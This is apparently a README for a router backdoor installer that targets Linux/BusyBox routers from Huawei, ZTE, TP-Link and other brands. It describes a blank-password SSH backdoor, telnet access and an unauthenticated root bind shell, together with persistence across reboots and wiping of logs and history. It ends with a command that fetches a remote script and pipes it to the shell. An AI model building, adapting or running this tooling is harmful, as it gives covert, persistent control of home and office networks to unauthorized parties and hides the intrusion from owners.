# Universal Router Backdoor

> **For authorized penetration testing only.**
> Written authorization from the target organization is required before use.

A single, self-adaptive backdoor installer for any router running Linux/BusyBox. Works on virtually any home/office router worldwide. Detects available tools, adapts automatically, installs what it can, persists across reboots, and cleans all traces.

---

## What It Does

When run once as root on a compatible router, the script:

| Step | Action |
|---|---|
| 1 | Detects what tools are available (Dropbear, telnetd, netcat, Python, OpenSSL, BusyBox) |
| 2 | Installs SSH backdoor on port 2222 (blank password, encrypted, if Dropbear found) |
| 3 | Installs Telnet backdoor on port 2323 (if telnetd found) |
| 4 | Installs TCP bind shell on port 2323 (immediate root, no auth — via netcat, BusyBox, or Python) |
| 5 | Persists all backdoors across reboot (writes to /etc/init.d/rcS or overlay) |
| 6 | Removes root password for blank SSH login |
| 7 | Cleans all traces (history, logs, script files) |
| 8 | Deletes itself |

At minimum, at least one backdoor will install — the TCP bind shell via netcat or BusyBox is available on virtually every router.

---

## Compatibility

| Brand | Models | Status |
|---|---|---|
| **Huawei** | HG532n, HG532e, HG532d, HG630 V2, HG8245 | ✅ Full support |
| **ZTE** | ZXHN H108N, H298A, F660 | ✅ Full support |
| **TP-Link** | Archer C series, TL-WR series | ✅ Full support |
| **D-Link** | DIR series | ✅ Full support |
| **Linksys** | WRT series, EA series | ✅ Full support |
| **Asus** | RT series | ✅ Full support |
| **Netgear** | R series | ✅ Full support |
| **OpenWRT** | Any version | ✅ Full support |
| **DD-WRT** | Any version | ✅ Full support |
| **Tomato** | Any version | ✅ Full support |
| **WE/Telecom Egypt** | All Huawei + ZTE models listed above | ✅ Full support |
| MikroTik RouterOS | All | ❌ Proprietary OS |
| Cisco IOS | All | ❌ Proprietary OS |
| Any proprietary RTOS | — | ❌ Not Linux/BusyBox |

**Rule of thumb:** If it runs Linux and has BusyBox, it works. The script checks for Dropbear, telnetd, netcat, BusyBox, and Python — whichever exists, it uses.

---

## How the Script Adapts

The script probes the router for these tools in order and installs accordingly:

| Tool | Used For | Found On |
|---|---|---|
| `dropbear` | SSH backdoor (encrypted, blank password) | Most routers — Huawei, TP-Link, D-Link, Linksys, Asus, Netgear, ZTE, OpenWRT, DD-WRT |
| `telnetd` | Telnet backdoor (plaintext, immediate shell) | Many routers with telnetd compiled in but disabled by default |
| `nc` with `-e` flag | TCP bind shell (netcat executes /bin/sh on connection) | Most full BusyBox builds |
| `nc` without `-e` | TCP bind shell via named pipe (fifo method) | Minimal BusyBox builds |
| `busybox nc` | TCP bind shell (BusyBox's built-in netcat) | Routers with BusyBox but no standalone netcat |
| `python` | TCP bind shell via socket library | Rare on embedded routers, possible on OpenWRT |
| `openssl` | Encrypted TCP shell (SSL-wrapped shell) | Some routers with OpenSSL compiled in |

**Fallback chain:** The script tries each method in order. If one fails, it moves to the next. At least the BusyBox or pipe method always works on any BusyBox-based router.

---

## Installation

### Prerequisites

- **Root shell** on the target router (obtained via RouterSploit, Metasploit, command injection, default credentials, etc.)
- **Internet access** on the router (to download the script) OR ability to host the script on your local machine

### From GitHub (Router Has Internet Access)

```bash
# From the router's root shell — one command:
wget -qO- https://raw.githubusercontent.com/YOUR_USERNAME/universal-router-backdoor/main/universal_backdoor.sh | sh
